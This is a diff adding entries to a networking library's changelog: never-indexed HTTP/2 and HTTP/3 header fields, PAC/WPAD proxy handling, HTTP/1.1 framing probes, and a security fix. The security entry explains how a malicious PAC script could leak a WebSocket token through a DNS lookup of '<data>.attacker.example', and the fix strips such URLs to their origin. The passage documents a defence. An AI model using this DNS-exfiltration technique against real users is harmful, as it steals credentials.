@@ -563,6 +563,15 @@ The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.
   preflight and the mingw dll in Docker on every run (before, only when it was older than the C sources), so Docker
   must be running, and `--with-interop` builds the Linux
   OpenSSL of the host's architecture; a dry run's last line now says how many steps it listed, not that they passed.
+- HTTP/2, never-indexed fields (RFC 7541 sections 6.2.3 and 7.1.3; experimental): the Ktor engines report the fields a
+  peer sent as literals never indexed (`ApplicationRequest.neverIndexedHeaders` on the server,
+  `HttpResponse.neverIndexedHeaders` on the client) and send the fields an application names as such
+  (`ApplicationResponse.neverIndex(...)`, `HttpRequestBuilder.neverIndex(...)`), so an application that proxies with
+  both engines keeps the representation an intermediary must keep. Before, the bit was dropped on decoding and only the
+  engine's own list of credentials went out never indexed. The same API carries QPACK's 'N' bit over HTTP/3 (RFC 9204
+  sections 4.5.4 and 7.1.3): the decoder reports it (`Http3Headers.neverIndexed`), and fields named with
+  `Http3Headers.withNeverIndexed(...)` (or the engines' `neverIndex`) go as literals with the bit, never inserted nor
+  referenced; a received section forwarded as it is keeps it. Before, the decoder dropped the bit.
 
 ### Changed
 
@@ -583,6 +592,40 @@ The format is based on [Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.
 - The bundled OpenSSL now includes its `http` and `ocsp` modules (`no-http` dropped from
   `tools/openssl/configure-flags.txt`; Configure turns `ocsp` off with `http`), for OCSP stapling. `ksl` calls no HTTP
   client code. Every OpenSSL build cache is rebuilt once, since the cache key hashes the configure flags.
+- Ktor client, proxy auto-configuration (RFC 6455 section 4.1 step 3): `ProxyResolvers.System` runs a PAC script or
+  WPAD. On Windows with WinHTTP's PAC engine (`WinHttpGetProxyForUrl`: automatic detection, WPAD, by DHCP and DNS,
+  then the PAC URL; each call goes without the user's credentials first, and with them only when the script's server
+  asks). On Apple platforms the engine runs PAC itself, as CFNetwork's engine drops the path and query before the
+  script runs: the script of the settings' PAC URL (downloaded directly, `http`, `https` or local `file`, at most 1 MiB read,
+  one download per URL at a time, kept 30 minutes, a failure 1 minute) or given inline, or WPAD's when the settings say "auto discover" (DHCP option 252, `http` or `https`
+  only, on macOS; then `wpad.<domain>` for each configured DNS search domain exactly, never a parent domain; then
+  `http://wpad/wpad.dat` for the system resolver to complete), run on JavaScriptCore with the PAC utility functions
+  (`…Ex` included) in a context without network, file or timer APIs, each run limited to 2 seconds from its start and
+  its DNS lookups within that (threat model 3.20.3). An answer naming only proxies the engine cannot use (`HTTPS`,
+  `SOCKS4`) fails closed: the next setting, else the request fails, never a direct connection. A WPAD discovery that
+  finds no script is logged once at Info. The script gets the URL as Chrome builds it (lower-case host, also as the
+  `host` argument): a `ws://` URI whole, with its resource name (RFC 6455 section 4.1); `wss` and `https` as their
+  origin only (`wss://host[:port]/`; see Security); `http` as its origin too, because the engine keeps answers per
+  scheme, host and port (Chrome and Android pass an `http` path); on the JVM and Android `ProxySelector.select` gets a WebSocket's resource name (`ws` as `http`, `wss` as
+  `https`, the schemes selectors know), though Android's PAC selector keeps it for `http` URIs only and the JDK's
+  passes only the scheme and host to the OS. On Apple platforms a run makes at most 20 distinct lookups (a name looked
+  up by both `dnsResolve` and `dnsResolveEx` counts twice), an answer is
+  at most 64 KiB of ASCII, an answer entry that breaks the grammar is skipped (none left: the script failed), and a
+  script given inline has the 1 MiB cap too. A lookup waits for the script at most 5 seconds (on Windows a WinHTTP call still running then, which
+  cannot be cancelled, ends on its own thread and its answer is dropped); a script that cannot be fetched or run in
+  that time gives the next setting (on Windows the fixed proxy), else a direct connection, with one warning. On
+  Windows a WPAD detection that finds no script is logged once at Info (automatic detection is on by default there)
+  and is not run again for 5 minutes; at most 4 WinHTTP calls run at once, and none while one that overran still
+  runs. Before, those requests connected directly.
+- Ktor client, HTTP/1.1 request framing (RFC 9112 section 6.1 MUST NOT): Transfer-Encoding (a body of unknown length,
+  or a transfer coding the application applied) goes only to a server known to handle HTTP/1.1: an HTTP/1.1 response
+  on the route, or ALPN `http/1.1`. On first contact without that knowledge (cleartext, or TLS without ALPN) the engine
+  first sends an `OPTIONS` for the request's target on the same connection and reads the version of its answer. A
+  server that answers with HTTP/1.0 gets a body of unknown length framed by Content-Length from a buffer of at most
+  1 MiB, sent once the body ended; a longer body, one that does not end within the connect timeout (or the request
+  timeout when that is shorter: a slow or duplex body), or a transfer coding of the application, fails that request
+  with IllegalStateException before anything of it is sent. `http11Hints` (servers known to handle HTTP/1.1) and `assumeHttp11` (every server) are the
+  RFC's "specific user configuration": requests to them go chunked at once, without the probe (experimental).
 - TLS server with client certificates (`trust` an `AnchoredCa`): the session ID context now covers the CA certificates
   as a set (each certificate's DER, not only its key), so tickets issued by a 0.2.x server do not resume on 0.3.0. In a
   rolling upgrade whose nodes share `SessionTicketConfig` keys, a client resuming across versions does one full handshake.
@@ -1715,6 +1758,17 @@ QUIC loss recovery and congestion control (RFC 9002 review):
   13 was upgraded too. It now gets 400, or 426 with `Upgrade: websocket` for another version (400 over HTTP/3), with
   `Sec-WebSocket-Version: 13`, and the handler does not run; over HTTP/3 a missing `sec-websocket-version` is no longer
   made up as 13 (RFC 8441 section 5).
+- Ktor client, proxy auto-configuration: a PAC script gets a `wss://` (and `https://`) URL as its origin only,
+  `wss://host[:port]/`, on Apple platforms and Windows. A script found by WPAD, or fetched from a plain-`http` PAC URL,
+  is code from the local network, and it can send what it is given out through `dnsResolve("<data>.attacker.example")`:
+  a token in a WebSocket's path or query would leak (the class of CVE-2016-3763 in Android and CVE-2016-5134 in Chrome,
+  which strip the same way since 2016; Firefox strips the path of every URL). This departs from RFC 6455 section 4.1,
+  whose PAC rule asks for the resource name (an owner-approved security deviation; `ws://` URIs still reach the script
+  whole). `engine { pacFullWebSocketUrl = true }` (*experimental*) gives the whole `wss` URI to the script the system
+  settings name, given inline or by an `https://` or local `file:///` URL, never to one WPAD found or one fetched over plain
+  `http://`
+  ([Proxies](docs/guide/ktor.md#proxies), [RFC 6455 §4.1](docs/spec/rfc/6455.md#s4-1-connecting-through-a-proxy)).
+  The development builds before this passed every script the whole `wss` URI.
 - JVM: the native library extraction (`KslLoader`) no longer creates anything under the umask or an inherited ACL
   (CodeQL `java/local-temp-file-or-directory-information-disclosure`). The library was written through
   `File.createTempFile` (mode `0644` under the usual umask) and missing parents of `-Dkuicksilver.native.workdir` were
